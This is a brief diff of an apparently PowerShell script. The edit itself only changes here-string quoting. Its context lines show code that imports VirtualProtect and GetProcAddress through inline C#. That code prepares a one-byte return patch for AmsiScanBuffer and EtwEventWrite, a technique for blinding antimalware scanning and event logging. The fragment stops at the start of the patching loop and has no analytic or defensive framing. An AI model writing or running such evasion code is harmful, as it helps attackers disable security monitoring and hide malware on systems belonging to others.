@@ -36,7 +36,7 @@ if (-not [Environment]::Is64BitProcess) {
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$null = Add-Type -TypeDefinition @"
+$null = Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
 public class VnxP {
@@ -44,7 +44,7 @@ public class VnxP {
     [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string p);
     [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);
 }
-"@ -Namespace VnxN
+'@
 $nop = [byte[]](0xC3)
 foreach ($m in @(@('amsi','AmsiScanBuffer'), @('ntdll','EtwEventWrite'))) {
     try {
